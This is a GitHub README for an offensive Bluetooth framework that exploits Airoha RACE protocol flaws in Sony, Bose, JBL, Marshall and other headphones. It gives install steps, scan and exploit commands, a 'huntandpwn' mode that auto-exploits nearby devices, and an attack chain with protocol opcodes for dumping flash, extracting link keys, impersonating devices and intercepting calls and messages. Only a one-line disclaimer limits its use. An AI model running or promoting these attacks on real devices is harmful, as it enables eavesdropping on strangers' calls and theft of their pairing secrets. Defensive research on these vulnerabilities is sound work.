# RACE - Bluetooth Headphone Jacking Framework

<img width="377" height="299" alt="Screenshot_20260705_225407" src="https://github.com/user-attachments/assets/7ffe41a7-0786-442c-9fda-7dfe75970006" />


**Institutional-grade exploitation framework for Airoha RACE vulnerabilities**

| CVE | CVSS | Description |
|-----|------|-------------|
| CVE-2025-20700 | 9.6 | Unauthenticated RACE protocol access over BLE |
| CVE-2025-20701 | 8.8 | Arbitrary flash read/write |
| CVE-2025-20702 | 9.1 | Link key extraction & device impersonation |

---

## Overview

RACE is a modular exploitation framework targeting the Airoha RACE protocol found in millions of Bluetooth headphones and speakers. The framework provides:

- **Discovery** – Find vulnerable devices via BLE service enumeration
- **Fingerprinting** – Extract SoC model, SDK version, and build timestamps
- **Flash Dumping** – Read arbitrary flash pages to extract Link Keys
- **Impersonation** – Clone device identity to intercept calls and messages

**DISCLAIMER**: This software is for authorized security testing only.
---

## Supported Devices

| Brand | Models |
|-------|--------|
| Sony | WH-1000XM4, WH-1000XM5, WH-1000XM6, WF-1000XM3, WF-1000XM4, WF-1000XM5, WH-CH520, WH-CH720N, WH-XB910N, LinkBuds S, ULT Wear, WI-C100 |
| Marshall | ACTON III, MAJOR V, MINOR IV, MOTIF II, STANMORE III, WOBURN III |
| Bose | QuietComfort Earbuds III |
| JBL | Endurance Race 2, Live Buds 3 |
| Jabra | Elite 8 Active |
| Beyerdynamic | Amiron 300 |
| Others | EarisMax Bluetooth Auracast, Jlab Epic Air Sport ANC |

*Full device compatibility list maintained at [Insinuator.net](https://insinuator.net/2025/12/bluetooth-headphone-jacking-full-disclosure-of-airoha-race-vulnerabilities/)*

---

## Installation

```bash
# Clone the repository
git clone https://github.com/ekomsSavior/RACE.git
cd RACE

# Install system dependencies
sudo apt update
sudo apt install -y bluez libbluetooth-dev python3-pip

# Install Python packages
pip3 install --user bleak asyncio click colorama bumble

# Make executable
chmod +x race.py
```

---

## Usage

### Scan for vulnerable devices

```bash
sudo python3 race.py scan
```

### Deep scan with service discovery

```bash
sudo python3 race.py scan --deep --timeout 15
```

### Hunt for RACE services

```bash
sudo python3 race.py hunt --timeout 20
```

### Fingerprint a target

```bash
sudo python3 race.py exploit A0:12:34:56:78:90 --action fingerprint
```

### Dump flash (Link Key extraction)

```bash
sudo python3 race.py exploit A0:12:34:56:78:90 --action dump
```

### Full exploit chain

```bash
sudo python3 race.py exploit A0:12:34:56:78:90 --action full
```

### Auto-hunt and pwn

```bash
sudo python3 race.py huntandpwn --timeout 30
```

---

## Framework Architecture

```
RACE/
├── race.py              # CLI entry point
├── core/
│   └── session.py       # Session management
├── transports/
│   ├── ble.py           # BLE GATT transport
│   └── classic.py       # RFCOMM transport (WIP)
├── modules/
│   ├── discovery.py     # Device discovery
│   ├── fingerprint.py   # Build info extraction
│   ├── exploit.py       # Auto-exploitation
│   └── auto_hunter.py   # Automated attack chain
└── utils/
    └── packet.py        # RACE protocol builder/parser
```

---

## Attack Chain

1. **Discovery** – Scan for BLE devices exposing RACE service UUID `00001200-0000-1000-8000-00805f9b34fb`
2. **Connection** – Establish GATT connection without authentication
3. **Fingerprint** – Send `0x1E08` to retrieve SoC/SDK information
4. **Flash Read** – Send `0x0403` to dump flash pages containing Link Keys
5. **Impersonation** – Use extracted Link Key to clone device identity
6. **Pivot** – Access HFP profile to intercept calls, contacts, and messages

---

## RACE Protocol Reference

| Field | Size | Description |
|-------|------|-------------|
| Head | 1B | `0x05` (standard) / `0x15` (FOTA) |
| Type | 1B | `0x00` (request) / `0x01` (response) |
| Length | 2B | Little-endian length of CMD + Payload |
| CMD | 2B | Command opcode |
| Payload | N | Variable-length command data |

### Key Commands

| Command | Opcode | Description |
|---------|--------|-------------|
| Get Build Version | `0x1E08` | SoC model, SDK version, build timestamp |
| Read Flash | `0x0403` | Read pages from flash memory |
| Read/Write RAM | `0x1680` / `0x1681` | Arbitrary memory access |
| Get BD_ADDR | `0x0C05` | Retrieve Bluetooth Classic address |

## Quick Reference Card

| Command | Purpose |
|---------|---------|
| `sudo python3 race.py scan` | Basic BLE scan |
| `sudo python3 race.py scan --deep` | Connect and verify RACE services |
| `sudo python3 race.py hunt` | Aggressive service discovery |
| `sudo python3 race.py exploit <MAC>` | Fingerprint target |
| `sudo python3 race.py exploit <MAC> --action dump` | Extract Link Key |
| `sudo python3 race.py exploit <MAC> --action full` | Full exploit chain |
| `sudo python3 race.py huntandpwn` | Auto-exploit everything |

---

## References

- [Full Disclosure: Bluetooth Headphone Jacking](https://insinuator.net/2025/12/bluetooth-headphone-jacking-full-disclosure-of-airoha-race-vulnerabilities/)
- [Airoha RACE Protocol Analysis](https://insinuator.net/)
- [CVE-2025-20700, CVE-2025-20701, CVE-2025-20702](https://cve.mitre.org/)

---

**DISCLAIMER**: This software is for authorized security testing only.


